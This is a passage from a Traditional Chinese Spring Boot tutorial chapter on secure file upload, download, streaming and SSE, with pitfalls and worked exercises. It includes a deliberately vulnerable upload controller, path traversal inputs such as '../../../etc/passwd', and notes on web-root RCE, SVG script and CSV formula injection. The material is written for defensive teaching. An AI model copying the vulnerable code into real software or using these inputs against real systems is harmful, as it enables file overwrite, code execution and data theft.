└── svg-with-script.svg                    含 <script> 的 SVG
```

```markdown
<!-- src/test/resources/security/README.md -->
# 安全測試的固定樣本

⚠️ **這些檔案是刻意惡意的**。它們存在的目的是讓
`example.shop.common.upload` 的防護有真實的測試對象。

| 檔案 | 用途 | 測試 |
|---|---|---|
| `photo-with-gps.jpg` | 驗證二次編碼會移除 EXIF | `ProductImageControllerTest.EXIF被移除` |
| `decompression-bomb-*.png` | 驗證「先讀 header 再解碼」 | `ImageReencoderTest.解壓縮炸彈` |
| ... | | |

## 不要做的事

- ❌ 不要把這個目錄加進 build 的 resources（它們絕不該進正式 jar）
- ❌ 不要在這裡放真的病毒樣本（用 EICAR 字串，而且要拆開寫 —— 見 5.5.6）
- ❌ 不要刪掉「看起來像垃圾」的檔案 —— 每一個都有對應的測試
```

⚠️ **那個 README 是必要的**。沒有它，三個月後會有人看到
`decompression-bomb-20000x20000.png` 而想「這什麼鬼，刪掉」——
然後測試變成 `TestAbortedException`（跳過而不是失敗），**沒有人會注意到**。

---

## 5.14 常見誤區

**誤區 1：「`getOriginalFilename()` 可以當儲存路徑」**

5.2.2、5.4：它是客戶端完全可控的字串。
`Paths.get(dir).resolve(filename)` **不會**阻止 `..`。
而修法不是「過濾 `..`」（`....//` 可以繞過），而是**只取最後一段**。

**誤區 2：「檢查 `Content-Type` 就知道是什麼檔案」**

5.5.1：`Content-Type` 和副檔名都由客戶端提供。
唯一可信的是**內容本身**（magic number + 二次編碼）。

**誤區 3：「magic number 對了就安全」**

5.5.2：polyglot 檔案可以同時是合法的 JPEG 與合法的 ZIP。
**真正的防護是二次編碼**（只保留像素，其餘全丟）。

**誤區 4：「`max-file-size: 10MB` 可以防記憶體攻擊」**

5.5.3：一個 41 KB 的 PNG 解碼後是 1.6 GB。
**檔案大小與記憶體用量無關**（壓縮格式的本質）。
必須檢查**尺寸**（而且要在 `ImageIO.read()` 之前）。

**誤區 5：「`MultipartFile` 可以傳給 `@Async` 方法」**

5.3.4：它的生命週期 = 請求的生命週期。
請求結束時暫存檔被刪 → 背景任務讀到 `FileNotFoundException`。
**症狀是「本機好、正式環境間歇性失敗」。**

**誤區 6：「`maxUploadSize` 的 advice 寫好了，使用者就會看到 413」**

5.3.7：Tomcat 的 `maxSwallowSize`（預設 2 MB）會讓「還在傳的大 body」
被直接 RST，使用者看到的是 connection reset 而不是你的 Problem JSON。
**要在 Filter 用 `Content-Length` 提早擋。**

**誤區 7：「Spring 的 `ContentDisposition` 已經處理好中文檔名」**

5.8.1：它只產生 `filename*`（無 ASCII 後備）或只產生 `filename`（會亂碼）。
RFC 6266 建議**兩者都給**，而那要自己組。

**誤區 8：「`inline` 只是顯示方式的差別」**

5.8.1：`inline` + HTML/SVG 內容 = **在你的網域上執行 script**。
使用者上傳的內容一律 `attachment`。

**誤區 9：「回傳 `Resource` 就有 Range 支援」**

5.8.3：對 `ByteArrayResource` / `FileSystemResource` 是的。
但 **`InputStreamResource` 的 `contentLength()` 會讀完整個流** ——
Range 會「成功」但 body 是空的。

**誤區 10：「`StreamingResponseBody` 就是在請求執行緒上跑」**

5.9.3：它跑在 async executor 上。
`SecurityContext`、MDC、交易、lazy 關聯**全部不可用**。
而且**沒設定 executor 的話 Spring 用 `SimpleAsyncTaskExecutor`（每個請求一條新執行緒）**。

**誤區 11：「串流失敗會回 500」**

5.9.4：狀態碼在第一個 byte 送出時就定了。
串流到一半失敗只能拿到「200 + 部分資料」——
**而 CSV 的部分資料看起來完全正常**（這是 41 萬筆報表事故的機制）。

**誤區 12：「串流很省記憶體，所以不用限制筆數」**

5.9.1：串流省的是「回應」的記憶體，
但如果查詢是 `findAll()`，41 萬個物件還是全部在 `List` 裡。
**串流要搭配分批查詢才有效。**

**誤區 13：「工作失敗要回 500」**

5.10.2：`GET /order-exports/{id}` 是在問「這個工作的狀態」。
**成功地回答「它失敗了」是 200。**
回 500 會讓前端顯示通用錯誤，而使用者需要看到的是「請縮小日期範圍」。

**誤區 14：「SSE 的 `complete()` 就是正常結束」**

5.11.9：瀏覽器會認為連線意外斷了，並在 3 秒後**自動重連**。
沒送 `stream.end` 事件的話 → **每 3 秒一次的無限迴圈**，
而使用者完全看不出異常。

**誤區 15：「SSE 不用心跳，反正瀏覽器會重連」**

5.11.4：中間層（Nginx 60s、ALB 60s）會回收空閒連線。
「瀏覽器會重連」讓功能看起來正常，但實際上是**每 60 秒一次的重連風暴**，
每次都要跑授權查詢與補送檢查。

**誤區 16：「SSE 在本機能動就代表能動」**

5.2.4、5.11.7：本機沒有 Nginx。
`proxy_buffering on`（預設）會讓事件被攢起來一次吐出，
`proxy_read_timeout 60s`（預設）會讓連線斷掉。
**必須有一個經過所有代理的驗證腳本**（5.11.7）。

**誤區 17：「SSE 不佔執行緒，所以可以無限開」**

5.11.8：它不佔**工作執行緒**，但佔 **Tomcat 的 connection slot**
（`max-connections` 預設 8192）與 file descriptor。
5000 條 SSE 會讓正常請求只剩 3192 個名額。

**誤區 18：「`Last-Event-ID` 解決了所有遺漏問題」**

5.11.5：使用者按 F5 時**不會有** `Last-Event-ID`。
而且它來自客戶端，格式必須驗證。
**「快照 + 增量」才是正確架構** —— SSE 不該是事件的唯一來源。

**誤區 19：「多實例部署下 SSE 自然會動」**

5.11.6：事件發生在 pod-C，連線在 pod-A → **事件永遠送不出去**。
3 個 pod 的話只有 1/3 的機率剛好對上。
需要 Redis pub/sub 或 Kafka。

**誤區 20：「CSV 就是純文字，沒有安全問題」**

5.9.2：CSV 公式注入。使用者把名字改成 `=HYPERLINK(...)`，
營運用 Excel 開報表就把整列資料送給攻擊者。
**xlsx 沒有這個問題**（它有型別）。

**誤區 21：「刪除檔案時先刪物件再改資料庫狀態」**

5.10.8：那段時間內下載端點會回 500（紀錄說 SUCCEEDED 但檔案不在）。
**順序是「先改狀態，再刪物件」。**

**誤區 22：「S3 的 lifecycle rule 只要設 `Expiration` 就好」**

5.7.3：`AbortIncompleteMultipartUpload` 常被漏掉，
而未完成的 multipart upload **會一直計費，且不出現在物件列表裡** ——
「bucket 看起來是空的，帳單卻是幾百美金」。

**誤區 23：「`@Scheduled` 的心跳一定會跑」**

5.11.4：Spring 的預設 scheduler **只有一條執行緒**，
而且**任務拋例外會讓它不再被排程**（沒有錯誤日誌）。
一定要設 `poolSize` 與 `errorHandler`。

**誤區 24：「測試用 `"fake".getBytes()` 當圖片就好」**

5.13.1：那過不了 magic number 檢查 → 所有測試都在測 415 的路徑，
**快樂路徑從來沒被執行過**。要用 `ImageIO.write()` 產生真的圖片。

**誤區 25：「MockMvc 測 `StreamingResponseBody` 直接看 body 就好」**

5.13.3：那是空字串。要用 `asyncDispatch(result)`。
而且因為你斷言的通常是狀態碼，**測試會「通過」但什麼都沒測到**。

---

## 5.15 本章練習

### 練習 1：找出這個上傳端點的 12 個問題

```java
@RestController
public class AvatarController {

    private static final String UPLOAD_DIR = "/var/www/html/static/avatars/";

    @Autowired
    private CustomerRepository customerRepository;

    @PostMapping("/customers/{customerId}/avatar")
    public Map<String, String> upload(@PathVariable String customerId,
                                      @RequestParam("file") MultipartFile file)
            throws Exception {

        if (file.getSize() > 5 * 1024 * 1024) {
            throw new RuntimeException("檔案太大");
        }

        String filename = file.getOriginalFilename();
        String ext = filename.substring(filename.lastIndexOf(".") + 1);

        if (!ext.equals("jpg") && !ext.equals("png") && !ext.equals("gif")
                && !ext.equals("svg")) {
            throw new RuntimeException("不支援的格式：" + ext);
        }

        if (!file.getContentType().startsWith("image/")) {
            throw new RuntimeException("不是圖片");
        }

        File target = new File(UPLOAD_DIR + customerId + "_" + filename);
        file.transferTo(target);

        Customer customer = customerRepository.findById(customerId).get();
        customer.setAvatarUrl("https://shop.example/static/avatars/" + target.getName());
        customerRepository.save(customer);

        thumbnailService.generateAsync(file, target.getName());

        log.info("使用者 {} 上傳了頭像 {}", customerId, filename);

        return Map.of("url", customer.getAvatarUrl());
    }
}
```

<details>
<summary>參考答案</summary>

**安全問題（6 個）**

**1. 路徑穿越（Critical）**
`UPLOAD_DIR + customerId + "_" + filename` —— `filename` 完全可控。

```
filename = "../../../../opt/app/config/application.yml"
→ /var/www/html/static/avatars/cus_1_../../../../opt/app/config/application.yml
```

⚠️ `customerId + "_"` 前綴讓最單純的穿越失效（因為路徑變成
`cus_1_../..`），**但只要多一層 `../` 就能繞過**：
`"../../../etc/cron.d/x"` → `.../avatars/cus_1_../../../etc/cron.d/x`
→ 正規化後是 `/var/www/html/etc/cron.d/x`。
而且如果 `filename` 以 `/` 開頭（`"/etc/passwd"`），
`new File("/dir/cus_1_" + "/etc/passwd")` 的行為依平台而異。

**修法**：`SafeFilename` + `StorageKeys`（5.4）。

**2. 檔案存在 web 根目錄（Critical）**
`/var/www/html/static/` 是 Nginx 的 document root。
上傳一個 `.php` / `.jsp`（配合問題 1 改路徑）→ **RCE**。

**修法**：存到物件儲存或 web 根目錄之外（5.5.1 的層 2）。

**3. 接受 SVG（High）**
5.5.5：SVG 可以含 script，而它會在 `shop.example` 這個 origin 上執行
→ 讀 cookie → session 劫持。

**4. 只看副檔名與 `Content-Type`（High）**
兩者都由客戶端提供。一個內容是 PHP 的 `avatar.jpg` 會通過所有檢查。

**修法**：magic number + 二次編碼（5.5.2、5.5.3）。

**5. 沒有尺寸檢查（High）**
`5 MB` 的大小限制防不了 20000×20000 的解壓縮炸彈（5.5.3）。

**6. IDOR（High）**
`@PathVariable String customerId` **完全沒有授權檢查** ——
任何登入的使用者都能改別人的頭像。

**修法**：注入 `@CurrentActor Actor` 並比對；或改成
`POST /me/avatar`（路徑上沒有別人的 ID，結構上就不可能 IDOR）。

**正確性問題（4 個）**

**7. `filename` 可能是 `null` → NPE**
`filename.substring(...)` 在 `getOriginalFilename()` 回 `null` 時爆掉，
而回應是 500（實際上該是 400）。

**8. 沒有副檔名時 `lastIndexOf(".")` 回 -1**
`substring(0)` → `ext` 等於整個檔名 → 進不了白名單 → 錯誤訊息很怪。

**9. `findById(customerId).get()`**
`Optional.get()` 在客戶不存在時拋 `NoSuchElementException` → 500（該是 404）。

**10. `@Async` 拿著 `MultipartFile`（5.3.4）**
請求結束 → 暫存檔被刪 → 背景任務間歇性失敗。

**設計問題（2 個）**

**11. `throw new RuntimeException`**
03 章：所有錯誤都變成 500，客戶端拿不到 `code`，
也不知道是「檔案太大」還是「格式不對」。

**修法**：用 `BusinessException` 的子類 + `ErrorCode`。

**12. 回 `Map<String, String>`**
03-rest-api 3.3：沒有型別、沒有 OpenAPI schema、
未來加欄位沒有編譯期保護。

**加分：兩個非功能問題**

**13. log injection（04 章 4.5.3）**
`log.info("... {}", filename)` —— filename 可含 `\r\n` + 假的 log 行。

**14. 沒有交易邊界**
`transferTo` 成功但 `save` 失敗 → 磁碟上有孤兒檔案。
（反過來也一樣：檔案系統操作無法參與資料庫交易，
所以正確做法是「先寫檔案再寫 DB，並有一個孤兒清理排程」，
或「先寫 DB 為 PENDING，寫檔成功後改 ACTIVE」。）

**重寫版**：

```java
@RestController
@RequestMapping("/me/avatar")                      // ★ 修 6：路徑上沒有別人的 ID
public class MyAvatarController {

    private static final Set<ContentTypeDetector.DetectedType> ACCEPTED = Set.of(
            ContentTypeDetector.DetectedType.JPEG,
            ContentTypeDetector.DetectedType.PNG,
            ContentTypeDetector.DetectedType.WEBP);    // ★ 修 3：沒有 SVG

    private final CustomerAvatarService avatarService;
    private final UploadValidator uploadValidator;    // ★ 修 4、5

    @PutMapping(consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    public AvatarResponse upload(@RequestPart("file") MultipartFile file,
                                 @CurrentActor Actor actor) {   // ★ 修 6

        // ★ 修 1、4、5、7、8：驗證與正規化全部委派
        ValidatedUpload upload = uploadValidator.validate(
                file, "avatars", ACCEPTED, /*reencodeImage*/ true);

        // ★ 修 2、9、10、14：Service 負責存物件 + 寫 DB + 發事件
        var result = avatarService.replaceAvatar(
                new ReplaceAvatarCommand(actor, upload.storageKey(),
                        upload.displayName(), upload.contentType(), upload.content()));

        // ★ 修 12：具名的 record
        return new AvatarResponse(result.url(), result.width(), result.height(),
                                  result.sizeBytes(), result.updatedAt());
    }

    /** ★ PUT 而不是 POST：頭像是「取代」語意，而且冪等（03-rest-api 2.4）。 */
    public record AvatarResponse(String url, int width, int height,
                                 long sizeBytes, Instant updatedAt) {}
}
```

⚠️ **`@PutMapping` 而不是 `@PostMapping`** 是一個容易忽略的改進：
頭像只有一張，上傳是「取代」而不是「新增」→ PUT 的語意正確，
而且**它天然是冪等的**（不需要 `Idempotency-Key`）。

</details>

### 練習 2：設計「批次匯入訂單」端點

**需求**：

- 營運上傳一個 CSV（最多 10,000 列）或 ZIP（含一個 CSV + 多張商品圖）。
- 需要驗證每一列（客戶存在、商品存在、金額正確）。
- 有錯誤的列要能明確回報**哪一列、哪一欄、什麼問題**。
- 部分成功要能接受（8,000 列成功、2,000 列失敗）。
- 營運要能下載「失敗明細」。

**請設計**：

1. 端點清單（URL + method + 狀態碼）。
2. 同步還是非同步？為什麼？
3. 錯誤明細的資料結構。
4. ZIP 的處理（圖片怎麼與 CSV 的列對應）。
5. 三個安全考量。

<details>
<summary>參考答案</summary>

**1. 端點清單**

```
POST   /order-import-jobs                      → 202 Accepted
       Location: /order-import-jobs/imp_01k39…
       multipart：file（CSV 或 ZIP）+ options（JSON）

GET    /order-import-jobs/imp_01k39…           → 200
       { status, progress, summary: { total, succeeded, failed } }

GET    /order-import-jobs/imp_01k39…/errors    → 200 + 分頁
       { items: [ { row, column, code, message, rawValue } ], page }

GET    /order-import-jobs/imp_01k39…/errors.csv → 200 + 串流
       （讓營運在 Excel 裡對照原始檔修正）

POST   /order-import-jobs/imp_01k39…/retries   → 202
       只重跑失敗的列（需要原始檔還在）

DELETE /order-import-jobs/imp_01k39…           → 204
```

**2. 非同步（202）**

理由：

| 因素 | 說明 |
|---|---|
| 10,000 列 × 每列 3 次查詢（客戶、商品、庫存） | 30,000 次查詢，約 90 秒 → **超過 Nginx 的 60 秒** |
| 部分成功 | 同步回應要怎麼表達「8000 成功 2000 失敗」？狀態碼是 200 還是 207？**非同步的 payload 表達得清楚得多** |
| 要能重試 | 需要保留原始檔與錯誤明細 → 需要一個持久化的工作 |
| 營運會上傳完就去做別的事 | 不需要盯著等 |

⚠️ **一個常見的錯誤設計是「同步 + 回 207 Multi-Status」**：
`207` 是 WebDAV 的狀態碼，一般 HTTP 客戶端與監控完全不認識它，
而且它仍然有 60 秒的逾時問題。

**3. 錯誤明細的資料結構**

```java
/**
 * 匯入的單筆錯誤。
 *
 * <p>★ 設計要點：欄位刻意與 {@code FieldViolation}（02 章 2.9.3）對齊，
 * 只多了 {@code row} 與 {@code rawValue} ——
 * 讓前端可以重用驗證錯誤的顯示元件。
 */
public record ImportError(

    /** ★ 1-based，而且是「CSV 檔案裡的列號」（含標題列）——
     *  營運會直接在 Excel 裡跳到那一列。用 0-based 會讓他們找錯。 */
    int row,

    /** CSV 的欄位名（不是 DTO 的欄位名）—— 營運看到的是 CSV 的標題。 */
    String column,

    /** ★ 沿用 ErrorCode 的常數名，讓錯誤可以被聚合統計。 */
    String code,

    String message,

    /**
     * 原始值（★ 一定要經過遮蔽與截斷）。
     *
     * <p>⚠️ 匯入檔案可能含客戶的信用卡號、身分證號 ——
     * 如果錯誤明細原樣回顯，那些值就進了 API 回應、進了前端 console、
     * 進了錯誤追蹤系統。用 03 章 3.9.6 的 {@code ValueMasker}。
     */
    String rawValue

) {}
```

```json
{
  "items": [
    { "row": 42, "column": "客戶編號", "code": "RESOURCE_NOT_FOUND",
      "message": "找不到客戶 cus_notexist", "rawValue": "cus_notexist" },
    { "row": 42, "column": "總金額", "code": "ORDER_AMOUNT_MISMATCH",
      "message": "小計 1200 + 運費 60 - 折扣 0 = 1260，但總金額欄位是 1200",
      "rawValue": "1200" },
    { "row": 187, "column": "信用卡號", "code": "CARD_NUMBER_INVALID",
      "message": "卡號格式不正確", "rawValue": "4111********1111" }
  ],
  "page": { "number": 0, "size": 50, "totalElements": 2013 }
}
```

⚠️ **同一列可以有多個錯誤**（第 42 列有兩筆）—— 這很重要：
「一列只報第一個錯」會讓營運修了一次又被退一次，來回五次才能匯入成功。

**4. ZIP 的處理：圖片與列的對應**

```
import.zip
├── orders.csv                 ★ 必須恰好一個 .csv（多個或零個 → 400）
└── images/
    ├── ord-001-receipt.jpg
    └── ord-002-receipt.jpg
```

```csv
訂單編號,客戶編號,總金額,收據檔名
ord-001,cus_9f,1260.00,images/ord-001-receipt.jpg
ord-002,cus_a1,880.00,images/ord-002-receipt.jpg
```

**對應規則**：CSV 有一個 `收據檔名` 欄，值是 **ZIP 內的相對路徑**。

⚠️ **這裡有一個安全陷阱**：`收據檔名` 是使用者提供的路徑。

```csv
ord-003,cus_b2,500.00,../../../etc/passwd
```

**修法**：不要用「路徑」查找，而是**先建立一個「清理後的名稱 → 內容」的 map**：

```java
// ① 第一遍：讀出所有非 CSV 的條目，用「清理後的檔名」當 key
Map<String, byte[]> attachments = new HashMap<>();
SafeZip.forEachEntry(zipStream, (name, in) -> {
    if (name.toLowerCase().endsWith(".csv")) {
        csvBytes = in.readAllBytes();
    } else {
        // ★ name 已經被 SafeZip 清理過（只剩檔名，沒有路徑）
        attachments.put(name, in.readAllBytes());
    }
});

// ② CSV 裡的參照也用同樣的清理規則
String referenced = SafeFilename.sanitize(row.receiptFilename(), "jpg");
byte[] content = attachments.get(referenced);
if (content == null) {
    errors.add(new ImportError(rowNumber, "收據檔名", "PHOTO_NOT_FOUND",
            "ZIP 內找不到這個檔案", ValueMasker.mask(row.receiptFilename())));
    continue;
}
```

⚠️ **「兩邊用同一個清理函式」是這個設計的關鍵** ——
它讓「路徑穿越」在結構上不可能（兩邊都被剝成純檔名），
同時保證合法的參照一定能對上。

**5. 三個安全考量**

**① ZIP bomb（5.5.4）**
`SafeZip` 的四道防線。⚠️ 特別注意 **`收據檔名` 可以重複指向同一個檔案** ——
10,000 列都指向同一張 50 MB 的圖 → 500 GB 的處理量。
**要加一條：每個附件最多被參照 N 次，或整批的附件總量有上限。**

**② 錯誤明細的資料洩漏**
`rawValue` 必須遮蔽（見上面的 `ImportError` javadoc）。
而且 `GET /order-import-jobs/{id}/errors` 要檢查**是不是自己建立的工作**
（IDOR —— 別人的匯入錯誤明細裡有別人的客戶資料）。

**③ 授權：匯入等於「代替客戶下單」**
這是一個**極高權限**的操作：

```java
    @PostMapping("/order-import-jobs")
    @PreAuthorize("hasRole('OPS_MANAGER')")        // ★ 不是所有客服都能匯入
    public ResponseEntity<ImportJobResponse> create(...) { }
```

⚠️ 而且每一筆匯入的訂單都要記錄 `createdBy = 匯入者`
（不是「系統」）—— 出事時要能追到人。

**加分：一個容易漏掉的正確性問題**

**匯入必須是「全有全無」還是「逐列獨立」？**

| 策略 | 交易 | 後果 |
|---|---|---|
| 全有全無 | 一個大交易包 10,000 列 | 🔴 一個長交易鎖住大量列（07-mysql 第 04 章）；而且一列失敗全部回滾 → 營運要修完 2000 個錯才能匯入任何東西 |
| **逐列獨立** ★ | 每列一個交易 | ✅ 8000 列成功、2000 列失敗；而且交易都很短 |
| 分批 | 每 100 列一個交易 | ⚠️ 一批裡有一列失敗 → 那 99 列也回滾 → 錯誤定位變得模糊 |

**選逐列獨立**，而且要在契約裡寫清楚「部分成功是預期行為」。

</details>

### 練習 3：預測這 10 種情況的回應

假設 shop-service 已按本章實作完成。對每一種情況寫出**狀態碼**與 `code`。

| # | 請求 | 狀態 | `code` |
|---|---|---|---|
| 1 | `POST /products/P-1/images`，檔案是 12 MB 的 JPEG | ? | ? |
| 2 | `POST /products/P-1/images`，檔案是 200 KB 的 SVG | ? | ? |
| 3 | `POST /products/P-1/images`，檔案是 41 KB 的 20000×20000 PNG | ? | ? |
| 4 | `POST /products/P-1/images`，`metadata` part 沒有 `Content-Type` | ? | ? |
| 5 | `GET /orders/ord_1/receipts/rcp_1`，收據屬於別人 | ? | ? |
| 6 | `GET /orders/ord_1/receipts/rcp_1`，掃毒還沒完成 | ? | ? |
| 7 | `GET /orders.csv?createdFrom=2020-01-01&createdTo=2026-08-01`（41 萬筆） | ? | ? |
| 8 | `GET /order-exports/exp_1`，工作已失敗 | ? | ? |
| 9 | `GET /order-exports/exp_1/file?token=dl_xxx`，token 已用 3 次 | ? | ? |
| 10 | `GET /orders/ord_1/events`，該 actor 已有 10 條 SSE 連線 | ? | ? |

<details>
<summary>參考答案</summary>

| # | 狀態 | `code` | 說明 |
|---|---|---|---|
| 1 | **413** | `PAYLOAD_TOO_LARGE` | `RequestSizeLimitFilter`（-118）用 `Content-Length` 提早擋（5.3.7）。⚠️ 如果客戶端用 chunked encoding，就會落到 Tomcat 的 `max-file-size` → advice → 也是 413，**但可能被 `maxSwallowSize` 打斷** |
| 2 | **415** | `UNSUPPORTED_MEDIA_TYPE` | SVG 沒有 magic number → `DetectedType.UNKNOWN` → 不在白名單（5.5.5）。⚠️ 回應的 `detectedType` 是 `"UNKNOWN"` 而不是 `"SVG"` |
| 3 | **413** | `PAYLOAD_TOO_LARGE` | `ImageReencoder.readDimensions()` 先讀 header → `pixels = 4×10⁸ > MAX_PIXELS`（5.5.3）。⚠️ 注意它**不是** 415 —— 檔案格式是合法的 PNG |
| 4 | **415** | `UNSUPPORTED_MEDIA_TYPE` | `HttpMediaTypeNotSupportedException` → advice 加上 `hint` 說明「每個 part 各自宣告 Content-Type」（5.6.2） |
| 5 | **404** | `RESOURCE_NOT_FOUND` | ★ 不是 403 —— 403 會確認「這個 ID 存在」（5.8.5） |
| 6 | **202** | `SCAN_PENDING` | + `Retry-After: 10`（5.12.4）。⚠️ 這是唯一一個 2xx 的 `ErrorCode`，而且我們明確承認它在 RFC 9457 上不精確 |
| 7 | **413** | `PAYLOAD_TOO_LARGE` | + `matchedRows: 410233`、`alternative: { POST /order-exports }`（5.9.2）。★ **不是 200 + 前 20000 筆** |
| 8 | **200** | — | ★ 工作狀態是 payload，不是 HTTP 錯誤。body 的 `status` 是 `"FAILED"`，`error.code` 是失敗原因（5.10.2） |
| 9 | **410** | `RESOURCE_GONE` | `DownloadTokenService.consume()` 的 `tryConsume` 回空（5.10.6）。⚠️ 「不存在」「過期」「用完」三種對外都是同一個回應 |
| 10 | **503** | `SERVICE_UNAVAILABLE` | + `Retry-After: 30`、`scope: "actor"`（5.11.6）。⚠️ **但瀏覽器的 `EventSource` 讀不到 body** —— 這正是 5.11.9 說「前端要先打一次一般 GET」的理由 |

**兩個容易答錯的**：

**#3 為什麼是 413 而不是 415？**
415 的語意是「我不支援這種媒體型別」。
但 PNG 是我們支援的型別 —— 問題是**這一張太大**。
413（Payload Too Large）才對。
⚠️ 而回應必須帶 `pixels` 與 `maxPixels`，
否則使用者看到「內容過大」但檔案只有 41 KB，會完全不知道發生什麼事。

**#8 為什麼是 200？**
`GET /order-exports/{id}` 是在讀取一個資源（工作）的表述。
**讀取成功就是 200**，即使那個資源的內容是「我失敗了」。
回 500 的話：
- 前端的通用錯誤處理會蓋掉 `error.userMessage`（使用者看不到「請縮小日期範圍」）。
- 監控會出現 5xx 告警（03 章 3.12.4）→ 值班的人被叫起來，
  但其實只是使用者的匯出條件不對。

</details>

### 練習 4：SSE 連線洩漏的除錯

**症狀**：服務跑了 3 天之後，新的請求開始間歇性失敗（連線逾時）。
重啟就好了，然後 3 天後又發生。

**你手上的資料**：

```
# Grafana：shop_sse_connections
Day 1  08:00   142
Day 1  20:00   890
Day 2  08:00  1,733
Day 2  20:00  2,504
Day 3  08:00  3,388
Day 3  20:00  4,201        ← 接近上限（api.sse.max-total-connections = 5000）

# tomcat_connections_current
Day 3  20:00  7,912 / 8,192
```

```
# 應用日誌（grep SSE）
2026-08-24 08:14:22 DEBUG SseEmitterRegistry - （沒有任何 unregister 的紀錄）
```

**請回答**：

1. 從這些數字能推論出什麼？
2. 有哪五個可能的原因？
3. 你會怎麼縮小範圍（具體的指令與程式碼）？
4. 找到之後怎麼防止它再發生？

<details>
<summary>參考答案</summary>

**1. 從數字能推論什麼**

```
Day 1 08:00 → Day 3 20:00 = 60 小時
142 → 4,201，淨增 4,059 條
平均每小時淨增 68 條

★ 關鍵觀察：曲線「只增不減」，連夜間（20:00 → 08:00，流量最低）也在增加。
```

**「夜間也在增加」排除了「就是使用者變多」這個解釋** ——
真的使用者在凌晨 3 點會關掉分頁。

**所以：連線被建立了，但從來沒有被移除。** `onCompletion` 沒有被呼叫，
或者被呼叫了但 `unregister` 沒生效。

⚠️ **而「沒有任何 unregister 的 DEBUG 紀錄」有兩種解讀**：
(a) `onCompletion` 真的沒被呼叫，或
(b) **DEBUG 等級沒開**（正式環境通常是 INFO）。
**先確認 (b)** —— 這是最便宜的檢查。

**2. 五個可能的原因**

**① `onCompletion` 的回呼在註冊之前就被觸發了**

```java
    // 🔴 順序錯了
    SseEmitter emitter = new SseEmitter(timeout);
    emitter.send(...);                        // 如果這裡拋 IOException…
    emitter.onCompletion(() -> registry.unregister(id));   // …這一行永遠不會執行
    registry.register(id, ..., emitter);
```

5.11.3 的順序（先註冊回呼、再註冊到 registry、最後 send）就是為了防這個。

**② `unregister` 用的 key 與 `register` 不同**

```java
    // 🔴 閉包捕獲的是一個「每次呼叫都不同」的值
    emitter.onCompletion(() -> registry.unregister(nextSubscriptionId()));  // 🔴
```

**③ `byOrder` 的空 list 沒被移除**

`bySubscription` 正確清空，但 `byOrder` 的 map 每個 orderId 留一個空 `List`。
⚠️ **這個情況下 `registry.size()`（回 `bySubscription.size()`）不會成長** ——
所以症狀不符。可以排除。

**④ `onCompletion` 在 async 逾時後不被呼叫（容器差異）**

某些容器版本在 `AsyncListener.onTimeout` 之後不會走到 `onComplete`。
⚠️ 這是一個真實存在的差異來源，值得實測。

**⑤ `emitter` 被強引用住，導致 `onCompletion` 執行了但物件仍在 map 裡**

```java
    // 🔴 有人為了「debug 方便」加了這個
    private final List<SseEmitter> allEverCreated = new ArrayList<>();   // 🔴
```

**3. 怎麼縮小範圍**

**步驟 1：確認日誌等級（最便宜）**

```bash
# 用 Actuator 動態開 DEBUG（不用重啟）
curl -X POST http://localhost:8080/actuator/loggers/example.shop.order.service \
     -H 'Content-Type: application/json' \
     -d '{"configuredLevel":"DEBUG"}'

# 觀察 5 分鐘，數 register 與 unregister 的次數
kubectl logs -f deploy/shop-service | grep -E 'SSE 連線(結束|建立)' \
  | awk '{print $NF}' | sort | uniq -c
```

**如果 register 100 次、unregister 3 次 → 確認是洩漏，繼續步驟 2。**
**如果兩邊次數相符 → 那 registry.size() 為什麼在成長？→ 看步驟 4。**

**步驟 2：加一個「連線年齡」的指標** ★

```java
    /**
     * ★ 這是找洩漏最有效的一個指標：
     * 如果有連線的年齡超過 CONNECTION_TIMEOUT（30 分鐘），
     * 那它「應該已經逾時了但沒有被移除」—— 直接指向問題。
     */
    @Scheduled(fixedRate = 60_000L)
    public void reportConnectionAges() {
        Instant now = Instant.now();
        long stale = bySubscription.values().stream()
                .filter(s -> Duration.between(s.createdAt(), now)
                        .compareTo(CONNECTION_TIMEOUT.plusMinutes(5)) > 0)
                .count();

        meterRegistry.gauge("shop.sse.connections.stale", stale);

        if (stale > 0) {
            log.error("有 {} 條 SSE 連線超過逾時時間仍未被移除 —— onCompletion 沒被呼叫",
                      stale);
            // ★ 印出最老的三條的細節
            bySubscription.values().stream()
                    .sorted(java.util.Comparator.comparing(Subscription::createdAt))
                    .limit(3)
                    .forEach(s -> log.error("  最老的連線 id={} orderId={} actor={} age={}",
                            s.subscriptionId(), s.orderId(), s.actorId(),
                            Duration.between(s.createdAt(), now)));
        }
    }
```

**步驟 3：用 heap dump 確認 emitter 有沒有被強引用**

```bash
# ★ 注意：heap dump 會讓 JVM 暫停幾秒，正式環境要選離峰或先移出 LB
kubectl exec shop-service-xxx -- jcmd 1 GC.heap_dump /tmp/heap.hprof
kubectl cp shop-service-xxx:/tmp/heap.hprof ./heap.hprof

# 在 Eclipse MAT 裡：
#   1. Histogram → 搜 SseEmitter → 看實例數
#   2. 如果實例數 >> registry.size()，那有別的東西抓著它們
#   3. 對其中一個做 "Path to GC Roots" → exclude weak references
```

**步驟 4：一個可以直接跑的重現測試**

```java
@Test
@DisplayName("重現：客戶端硬斷線後 registry 是否清空")
void 硬斷線() throws Exception {
    // ★ 用原始 socket 模擬「拔網路線」——
    //   WebClient 的 dispose() 會發 FIN，那是「優雅斷線」，
    //   而洩漏往往只發生在「非優雅」的情況
    var socket = new java.net.Socket("localhost", port);
    socket.getOutputStream().write(("""
            GET /orders/ord_1/events HTTP/1.1\r
            Host: localhost\r
            Accept: text/event-stream\r
            Authorization: Bearer %s\r
            \r
            """.formatted(testToken("cus_1"))).getBytes());
    socket.getOutputStream().flush();

    Awaitility.await().until(() -> registry.size() == 1);

    // ★ 用 SO_LINGER 0 讓 close() 送 RST 而不是 FIN（模擬硬斷線）
    socket.setSoLinger(true, 0);
    socket.close();

    // ⚠️ RST 的偵測需要一次寫入嘗試 —— 也就是需要等一次心跳（20 秒）
    Awaitility.await()
            .atMost(Duration.ofSeconds(40))
            .untilAsserted(() -> assertThat(registry.size())
                    .as("硬斷線後 registry 沒有清空 —— 這就是洩漏")
                    .isZero());
}
```

⚠️ **這個測試裡的 `SO_LINGER 0` 是關鍵**。
用一般的 `close()` 測不出問題，因為 FIN 會讓容器立刻知道對方走了。
**真實世界的斷線大多是「非優雅」的**（手機進電梯、Wi-Fi 切換、程序被 kill），
而那需要「嘗試寫入」才會被發現 —— 也就是需要心跳。

**這個測試同時證明了「心跳是偵測死連線的唯一手段」（5.11.4）。**

**4. 怎麼防止再發生**

| 防護 | 說明 |
|---|---|
